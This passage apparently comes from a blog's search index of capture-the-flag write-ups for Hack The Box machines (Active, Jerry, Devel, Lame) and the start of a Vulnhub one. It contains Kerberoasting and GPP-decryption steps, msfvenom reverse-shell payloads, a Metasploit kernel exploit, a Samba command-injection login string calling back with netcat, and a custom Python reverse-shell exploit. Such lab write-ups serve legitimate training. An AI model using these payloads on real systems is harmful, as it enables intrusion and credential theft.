cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt;GPP DECRYPTwe can decrypt the gpp hash using gpp-decrypt$gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQGPPstillStandingStrong2k18now we have user credential SVC_TGS:GPPstillStandingStrong2k18 which we can use to enumerate shares.USERS SHAREUsing smbmap to enumerate users share using SVC_TGS creds.$smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18[+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON READ ONLY Logon server share Replication READ ONLY SYSVOL READ ONLY Logon server share Users READ ONLYWe can also use smbclinet to have look in the users share.$smbclient //10.10.10.100/Users -U active.htb\\\\SVC_TGS%GPPstillStandingStrong2k18Try \"help\" to get a list of possible commands.smb: \\&gt; dir . DR 0 Sat Jul 21 20:24:20 2018 .. DR 0 Sat Jul 21 20:24:20 2018 Administrator D 0 Mon Jul 16 15:59:21 2018 All Users DHSrn 0 Tue Jul 14 10:51:44 2009 Default DHR 0 Tue Jul 14 12:23:21 2009 Default User DHSrn 0 Tue Jul 14 10:51:44 2009 desktop.ini AHS 174 Tue Jul 14 10:42:55 2009 Public DR 0 Tue Jul 14 10:42:55 2009 SVC_TGS D 0 Sat Jul 21 21:01:32 2018we can now grab the uesr.txt filesmb: \\SVC_TGS\\Desktop\\&gt; get user.txtgetting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)$cat user.txt47f872b0248126f48aa7ffa1e31cda29KERBEROASTINGGet hash of administratorwe will now impacket-GetUserSPNs to get a list of service usernames associated with normal user accounts.$impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile GetUserSPNs.outImpacket v0.9.22 - Copyright 2020 SecureAuth CorporationPassword:ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation-------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ----------active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 00:51:40.351723 2023-01-17 20:38:45.732539it gives the ticket of administrator, which we can try to bruteforce and decrypt the password.$cat GetUserSPNs.out$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b4280b69cde3574becd49754a4f07da3$12b3d53d702029a731961afeef1a0e8887c960f89b721fe7c0b38a3233a3b044703ab0324e9ace05eebda7e9a4be3bc3205c644c718711ce22230aaa4ff3af8f3a674e7d6d51124a62f8f97eee01a06cae599597491551538cd7e1c670814945ecbfac6a0ff8775fe89cb09bb7174f3994fd5151998f78173dd776ca243c9241f746a84cf8e88b970d2bae520d2cccb9b6c485ebf364b3cd930c4a3bfab3bf3caad8867b75e7dd1254a742abe2740e8be88c75736dbc6b6c4d32aa4de293974f22877411792b686427cc8d27186b4cdadad00707df5b8792fbca1439650ddee65c6c411f1975fa55f21c67fd8e86d91287c122dffecafa5f86019eff18866d2fecbaa171950f7c8acd684523a2d612120c3bfd0a60967fee8fbbadc6f1477c60d8263a5a58945a8ab1d4c9ef138f7af363bc2911d68782b980826a3d1c313d727b4d899c593945a7cd14653ad7448e51512b0649b8bb1582737cd03d78602bb85e312797c1aafd5f047d79f9b7f907215b8c3c8b4d8ea82d9b4fd2238a308b89c03c9a83e3ee0aa1c209019c23c0a7f209e01feb1b96bcf659f73e899c9fffa1fdf9960b64d31173d28c9485fe92c346010e8bb38a2f959d9b01fd51109ac80162bfdfb73e4aead53317008f09b5545ae8faf84f4946661bdf3fa11828e7b59f0d4766d549e904290ba7972efc5721077434de3a8947b607dc14f8e4f424acbeb5c95a2f8da4b9ca0360d1f61ea51cb5d2421f0161dfabc860e185505c6c6b66e0ffd183d3e2cf83ad975150e03987ff3e578da722850a6d9c24a52f30ad4772148c20812f8d5289d4dfbbf96a5d6b8d7ec969d32f5a83c1c1420b59bf358381b1487efc5348abb78843b2451368ad2d6a7ee7ba0625f2086ab342c91d2bcb75292e9c99f4a98aff768057b3bdd839e4336ac1a1b1f9e2fc49d88d4bf7f23c7665a5eadb9c699caf3e774bd79d3b80d578a7823529a77699809ac6babdde1a9fa63ac84ee437838a8e03642e7e64c7931e6b1a9e9000cbf4e5ef63429c4c4896f9b335db3e30f8e49e8aaad48877cd4f109c12fe9854a0e3b9032fa8f727ab442af07d462d0c209b2f0680dce97cffe36ffbdc53073467a1da3ec02dbe04857130f44ef6d8fdf3f498236f9d0182aa75df9539cc9ad70b05c35c64cb251c696aedf19b88e6f70bd426b6bd732fe82ab9f637ead98a1067c964906e2914ef435306f1de21d753bc3062f43d51117ac9a29f4bda03a98f2647a058HashcatUsing hashcat to decrypt the ticket.hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force hashcat (v4.0.1) starting... $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968SHELL AS ADMINISTRATORUsing impacket-psexec to get the administrator shell.$impacket-psexec administrator@10.10.10.100Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationPassword:[*] Requesting shares on 10.10.10.100.....[*] Found writable share ADMIN$[*] Uploading file bEDYZPTi.exe[*] Opening SVCManager on 10.10.10.100.....[*] Creating service MuHf on 10.10.10.100.....[*] Starting service MuHf.....[!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoami nt authority\\systemReference:https://www.youtube.com/watch?v=Jaa2LmZaNeU" }, { "title": "Hack The Box - Jerry", "url": "/posts/Hack-The-Box-Jerry/", "categories": "hackthebox", "tags": "windows, tomcat, easy", "date": "2023-01-16 03:10:00 -0500", "snippet": "RECONNMAPStarting with nmap, it only shows one port 8080 (Apache Tomcat) open.$sudo nmap -sC -sV -p- --min-rate 10000 -Pn -oN jerry-all-tcp.nmap 10.10.10.95 Nmap scan report for 10.10.10.95Host is ...", "content": "RECONNMAPStarting with nmap, it only shows one port 8080 (Apache Tomcat) open.$sudo nmap -sC -sV -p- --min-rate 10000 -Pn -oN jerry-all-tcp.nmap 10.10.10.95 Nmap scan report for 10.10.10.95Host is up (0.092s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE VERSION8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/7.0.88|_http-server-header: Apache-Coyote/1.1Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jan 16 21:13:37 2023 -- 1 IP address (1 host up) scanned in 31.99 secondsPORT - 8080Default install of tomcat.LoginUsing the default credentials tomcat:s3cret we can login to the Tomcat Manager Application.EXPLOITINTG TOMCATGenerating war file using msfvenom$sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f war &gt; shell.warSHELL AS ADMINISTRATOROnce we upload the war file and visit http://10.10.10.95/shell we get shell as administrator.$sudo nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.14.13] from (UNKNOWN) [10.10.10.95] 49192Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\\apache-tomcat-7.0.88&gt;whoamiwhoamint authority\\system" }, { "title": "Hack The Box - Devel", "url": "/posts/Hack-the-box-Devel/", "categories": "hackthebox", "tags": "hackthebox, windows, ftp, cve, metasploit, easy", "date": "2023-01-04 19:33:00 -0500", "snippet": "RECONNMAPStrating with nmap it shows two ports open 80 httpd and 21 ftp# nmap -sC -sV 10.10.10.5 -oN devel.htb Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 21:31 +0545 RTTVAR has grown t...", "content": "RECONNMAPStrating with nmap it shows two ports open 80 httpd and 21 ftp# nmap -sC -sV 10.10.10.5 -oN devel.htb Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 21:31 +0545 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 93.13% done; ETC: 21:32 (0:00:06 remaining) Nmap scan report for 10.10.10.5 Host is up (0.51s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM &lt;DIR&gt; aspnet_client | 12-11-22 11:46AM 2753 aspxshell.aspx | 03-17-17 04:37PM 689 iisstart.htm | 12-11-22 11:38AM 19 text.txt |_03-17-17 04:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: IIS7 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 122.97 secondsnmap shows that anonymoys ftp login is enabled. we can now try to upload file.WEB PORT - 80The page is just the default IIS page:HEADERSSeeing that this server is running ASP.NET means we can upload a .aspx webshell and get shell.# curl -I 10.10.10.5 HTTP/1.1 200 OK Content-Length: 689 Content-Type: text/html Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT Accept-Ranges: bytes ETag: \"37b5ed12c9fd21:0\" Server: Microsoft-IIS/7.5 X-Powered-By: ASP.NET Date: Thu, 05 Jan 2023 02:28:13 GMTMETERPRETERGenerating meterpreter reverse shell .# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f aspx &gt; shell.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of aspx file: 2878 bytesuploading reverse shell using ftp anoymous login .# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:niraz): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; put shell.aspx local: shell.aspx remote: shell.aspx 200 PORT command successful. 150 Opening ASCII mode data connection. 226 Transfer complete. 2918 bytes sent in 0.00 secs (13.6413 MB/s) ftp&gt;SHELL AS WEBmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.22 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target View the full module info with the info, or info -d command. msf6 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.14.22:4444 [*] Sending stage (175686 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.14.22:4444 -&gt; 10.10.10.5:49157) at 2023-01-05 07:48:54 +0545 meterpreter &gt; sysinfo Computer : DEVEL OS : Windows 7 (6.1 Build 7600). Architecture : x86 System Language : el_GR Domain : HTB Logged On Users : 2 Meterpreter : x86/windows meterpreter &gt;c:\\windows\\system32\\inetsrv&gt;whoami whoami iis apppool\\webPRIV ESEC TO SYSTEMusing metasploit post module local exploit suggester to look for available methods to priv esec.msf6 exploit(multi/handler) &gt; search suggester Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester msf6 exploit(multi/handler) &gt; use 0 msf6 post(multi/recon/local_exploit_suggester) &gt; show options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits View the full module info with the info, or info -d command. msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1 session =&gt; 1 msf6 post(multi/recon/local_exploit_suggester) &gt; run [*] 10.10.10.5 - Collecting local exploits for x86/windows... [*] 10.10.10.5 - 176 exploit checks are being tried... [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Running check method for exploit 41 / 41 [*] 10.10.10.5 - Valid modules for session 1:MS13_053Description:This module leverages a kernel pool overflow in Win32k which allows local privilege escalation. The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process). This allows any unprivileged process to freely migrate to winlogon.exe, achieving privilege escalation.msf6 exploit(windows/local/ms13_053_schlamperei) &gt; set session 1 session =&gt; 1 msf6 exploit(windows/local/ms13_053_schlamperei) &gt; run [*] Started reverse TCP handler on 10.10.14.22:4444 [*] Launching notepad to host the exploit... [+] Process 2860 launched. [*] Reflectively injecting the exploit DLL into 2860... [*] Injecting exploit into 2860... [*] Found winlogon.exe with PID 428 [+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell [*] Sending stage (175686 bytes) to 10.10.10.5 [*] Meterpreter session 2 opened (10.10.14.22:4444 -&gt; 10.10.10.5:49158) at 2023-01-05 08:00:21 +0545 meterpreter &gt; shell Process 2532 created. Channel 1 created. Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami whoami nt authority\\system" }, { "title": "Hack The Box - Lame", "url": "/posts/Hack-The-Box-Lame/", "categories": "hackthebox", "tags": "windows, cve, metasploit, easy", "date": "2022-11-11 00:00:00 -0500", "snippet": "ReconStarting with nmap scan.# nmap --min-rate 10000 -oN lame.nmap 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 Nmap scan report for 10.10.10.3 Host is up (0.63s lat...", "content": "ReconStarting with nmap scan.# nmap --min-rate 10000 -oN lame.nmap 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 Nmap scan report for 10.10.10.3 Host is up (0.63s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds# Full TCP port scan# nmap -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 Nmap scan report for 10.10.10.3 Host is up (0.59s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3632/tcp open distccd Nmap done: 1 IP address (1 host up) scanned in 133.07 seconds# Full UDP port scan#nmap -sU -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:17 +0545 Nmap scan report for 10.10.10.3 Host is up (0.48s latency). Not shown: 65531 open|filtered udp ports (no-response) PORT STATE SERVICE 22/udp closed ssh 139/udp closed netbios-ssn 445/udp closed microsoft-ds 3632/udp closed distcc Nmap done: 1 IP address (1 host up) scanned in 50.50 seconds#nmap -sC -sV -p 22,139,445,3632 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:19 +0545 Nmap scan report for 10.10.10.3 Host is up (0.51s latency). PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h29m43s, deviation: 3h32m09s, median: -17s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-11-11T08:34:45-05:00 |_smb2-time: Protocol negotiation failed (SMB2) | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.24 secondsOur initial recon shows that we potentially have four different points of entry to this machine. Port 21: vsftpd 2.3.4 (Anonymous FTP login allowed) Port 22: OpenSSH 4.7p1 Debian 8ubuntu1 Port 139/445: Running samba 3.0.20-Debian Port 3632:** distccd v1EnumerationPort - 21 (vsftpd 2.3.4 )Anonymous LoginSince FTP allows anonymous logins, checked it, but the directory was empty.A quick google search shows us that this version is famously vulnerable to a backdoor command execution that is triggered by entering a string that contains the characters “:)” as the username. When the backdoor is triggered, the target machine opens a shell on port 6200.Found a nmap script to check this vulnerability.Scanning with nmap script shows that this machine is not vulnerable.#nmap --script ftp-vsftpd-backdoor.nse 10.10.10.3 -p 21 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:33 +0545 Nmap scan report for 10.10.10.3 Host is up (0.27s latency). PORT STATE SERVICE 21/tcp open ftp Nmap done: 1 IP address (1 host up) scanned in 27.98 secondsSMB - TCP 445Anonymous Loginsmbmap shows only /tmp directory is accessible without credentials.#smbmap -H 10.10.10.3 [+] IP: 10.10.10.3:445\tName: 10.10.10.3 Disk \tPermissions\tComment \t---- \t-----------\t------- \tprint$ \tNO ACCESS\tPrinter Drivers \ttmp \tREAD, WRITE\toh noes! \topt \tNO ACCESS\t \tIPC$ \tNO ACCESS\tIPC Service (lame server (Samba 3.0.20-Debian)) \tADMIN$ \tNO ACCESS\tIPC Service (lame server (Samba 3.0.20-Debian))After checking the /tmp directory with smbclient, it seems there’s nothing interesting.#smbclient -N //10.10.10.3/tmp Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\&gt; dir . D 0 Fri Nov 11 19:40:58 2022 .. DR 0 Sat Oct 31 13:18:58 2020 .ICE-unix DH 0 Fri Nov 11 18:28:11 2022 vmware-root DR 0 Fri Nov 11 18:28:39 2022 .X11-unix DH 0 Fri Nov 11 18:28:36 2022 .X0-lock HR 11 Fri Nov 11 18:28:36 2022 5575.jsvc_up R 0 Fri Nov 11 18:29:13 2022 vgauthsvclog.txt.0 R 1600 Fri Nov 11 18:28:10 2022 \t\t7282168 blocks of size 1024. 5386512 blocks available smb: \\&gt;On checking searchsplpoit, we got some exploits for samba 3.0.However,Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) seems interesting. This is CVE-2007-2447, often referred to as Samba usermap script.On checking the script, there seems to be an issue with the username field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands.Going through the code tells us that the script is running the following command, where payload.encoded would be a reverse shell sent back to our attack machine.\"/=`nohup \" + payload.encoded + \"`\"Port 3632 distcc v1Googling “distcc v1” reveals that this service is vulnerable to a remote code execution and there’s an nmap script that can verify that. On executing nmap script, it states that this machine is vulnerable.#nmap --script distcc-cve2004-2687.nse -p 3632 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 20:11 +0545 Nmap scan report for 10.10.10.3 Host is up (0.31s latency). PORT STATE SERVICE 3632/tcp open distccd | distcc-cve2004-2687: | VULNERABLE: | distcc Daemon Command Execution | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2004-2687 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Allows executing of arbitrary commands on systems running distccd 3.1 and | earlier. The vulnerability is the consequence of weak service configuration. | | Disclosure date: 2002-02-01 | Extra information: | | uid=1(daemon) gid=1(daemon) groups=1(daemon) | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 | https://distcc.github.io/security.html |_ https://nvd.nist.gov/vuln/detail/CVE-2004-2687 Nmap done: 1 IP address (1 host up) scanned in 7.66 secondsExploitation:1. Samba ExploitExploing using smbclient.#smbclient //10.10.10.3/tmp Enter WORKGROUP\\niraz's password: Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\&gt; logon \"/=`nohup nc -nv 10.10.14.2 4444 -e /bin/sh`\" Password:and we get connection back to our machine.#nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 53095whoami root2. Exploiting samba using python scriptAfter Googling it let me to this GitHub with a Python POC for the exploit. we can get a shell easily, by following the “install” instructions and then running the script:But writing my own script, so that i can have some practice in writing code.import sys from smb.SMBConnection import SMBConnectiondef exploit(rhost,rport,lhost,lport): payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0&lt;/tmp/hago | /bin/sh &gt;/tmp/hago 2&gt;&amp;1; rm /tmp/hago' username = \"/=`nohup \" + payload + \"`\" smb_conn = SMBConnection(username, \"\", \"\", \"\") try: smb_conn.connect(rhost,rport) except: print(\"[+] Payload was sent but something went wrong - check netcat !\")def main(): print(\"[*] CVE-2007-2447 - Samba usermap script\") if len(sys.argv) != 5: print(\"(+)Usage: %s &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt; \" % sys.argv[0]) else: print(\"[+] Connecting !\") rhost = sys.argv[1] rport = sys.argv[2] lhost = sys.argv[3] lport = sys.argv[4] exploit(rhost,rport,lhost,lport)if __name__ == '__main__': main()running the above python script we get the root shell#python3 lame-smb-exploit.py 10.10.10.3 139 10.10.14.2 4444 [*] CVE-2007-2447 - Samba usermap script [+] Connecting !#nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 39930whoamirootTo get a nice shell we can use ptypython -c 'import pty; pty.spawn(\"bash\")' root@lame:/#" }, { "title": "Vulnhub - Development", "url": "/posts/Vulnhub-Development/", "categories": "Vulnhub", "tags": "vulnhub", "date": "2022-08-09 23:33:00 -0400", "snippet": "NMAPStarting with nmap we found few open ports 22(ssh),139(NetBIOS-ssn), 445(NetBIOS-ssn), 8080(http-proxy). Nmap also indicates it as a ubuntu machine.$nmap -sC -sV 192.168.1.124 -oN developement....", "content": "NMAPStarting with nmap we found few open ports 22(ssh),139(NetBIOS-ssn), 445(NetBIOS-ssn), 8080(http-proxy). Nmap also indicates it as a ubuntu machine.$nmap -sC -sV 192.168.1.124 -oN developement.nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 19:21 +0545Nmap scan report for 192.168.1.124Host is up (0.0063s latency).Not shown: 995 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |_ 2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)113/tcp open ident?|_auth-owners: oident139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)|_auth-owners: root445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)|_auth-owners: root8080/tcp open http-proxy IIS 6.0| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Date: Fri, 25 Jun 2021 13:41:01 GMT| Server: IIS 6.0| Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT| ETag: \"230-57de32091ad69\"| Accept-Ranges: bytes| Content-Length: 560| Vary: Accept-Encoding| Connection: close| Content-Type: text/html| &lt;html&gt;| &lt;head&gt;&lt;title&gt;DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;p&gt;Welcome to the Development Page.&lt;/p&gt;| &lt;br/&gt;| &lt;p&gt;There are many projects in this box. View some of these projects at html_pages.&lt;/p&gt;| &lt;br/&gt;| &lt;p&gt;WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.&lt;/p&gt;| &lt;br/&gt;| &lt;br/&gt;| &lt;br/&gt;| &lt;hr&gt;| &lt;i&gt;Powered by IIS 6.0&lt;/i&gt;| &lt;/body&gt;| &lt;!-- Searching for development secret page... where could it be? --&gt;| &lt;!-- Patrick, Head of Development--&gt;| &lt;/html&gt;| HTTPOptions: | HTTP/1.1 200 OK| Date: Fri, 25 Jun 2021 13:41:01 GMT| Server: IIS 6.0| Allow: GET,POST,OPTIONS,HEAD| Content-Length: 0| Connection: close| Content-Type: text/html| RTSPRequest: | HTTP/1.1 400 Bad Request| Date: Fri, 25 Jun 2021 13:41:01 GMT| Server: IIS 6.0| Content-Length: 310| Connection: close| Content-Type: text/html; charset=iso-8859-1| &lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;| &lt;html&gt;&lt;head&gt;| &lt;title&gt;400 Bad Request&lt;/title&gt;| &lt;/head&gt;&lt;body&gt;| &lt;h1&gt;Bad Request&lt;/h1&gt;| &lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;| &lt;/p&gt;| &lt;hr&gt;| &lt;address&gt;IIS 6.0 Server at 2400-1A00-B050-ip6.wlink.com.np Port 